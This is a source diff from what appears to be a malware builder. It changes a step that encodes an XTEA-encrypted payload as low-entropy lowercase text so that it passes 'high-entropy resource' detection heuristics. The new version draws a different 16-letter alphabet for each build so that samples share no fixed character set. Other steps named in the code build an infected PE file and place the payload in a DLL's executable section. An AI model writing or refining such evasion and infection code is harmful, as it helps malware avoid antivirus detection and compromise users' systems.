@@ -651,12 +651,16 @@ int main(int argc, char* argv[]) {
   /* Zero XTEA key from stack — key_salt is still needed for BuildInfectedPE */
   SecureZeroMemory(xteaKey, sizeof(xteaKey));
 
-  /* STEP 8.5: Entropy shaping — map every nibble of the XTEA blob to one of 16
-   * high-frequency lowercase ASCII letters.  A raw XTEA blob sits at ~8 bits/byte
-   * and trips every "high-entropy resource" heuristic; after shaping the .rsrc
-   * payload measures ~4.0 bits/byte over printable text characters.
+  /* STEP 8.5: Entropy shaping — map every nibble of the XTEA blob to one
+   * symbol of a per-build 16-letter alphabet (drawn from a-z by
+   * EntropyDeriveAlphabet, seeded with key_salt — no fixed cross-sample
+   * charset).  A raw XTEA blob sits at ~8 bits/byte and trips every
+   * "high-entropy resource" heuristic; after shaping the .rsrc payload
+   * measures ~4.0 bits/byte over printable text characters.
    * Cost: 2x resource size.  metadata.blobSize keeps the DECODED size. */
   printf("[*] Phase 8.5: Entropy shaping (nibble-to-text encoding)...\n");
+  BYTE entropyAlphabet[16];
+  EntropyDeriveAlphabet((const BYTE*)key_salt, entropyAlphabet);
   DWORD decodedBlobSize = (DWORD)mutated.totalSize;
   DWORD encodedSize     = decodedBlobSize * 2;
   BYTE* encodedBuffer   = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encodedSize);
@@ -666,9 +670,9 @@ int main(int argc, char* argv[]) {
       HeapFree(GetProcessHeap(), 0, compressedBuffer);
       return 1;
   }
-  EntropyEncode(mutated.pBuffer, decodedBlobSize, encodedBuffer);
-  printf("[+] Entropy shaped: %lu -> %lu bytes (alphabet=16, ~4.0 bits/byte)\n",
-         decodedBlobSize, encodedSize);
+  EntropyEncode(mutated.pBuffer, decodedBlobSize, encodedBuffer, entropyAlphabet);
+  printf("[+] Entropy shaped: %lu -> %lu bytes (alphabet=%.16s, ~4.0 bits/byte)\n",
+         decodedBlobSize, encodedSize, entropyAlphabet);
 
   /* STEP 9: Verify that at least one preset DLL has an executable section
    *           large enough to hold the final payload blob.
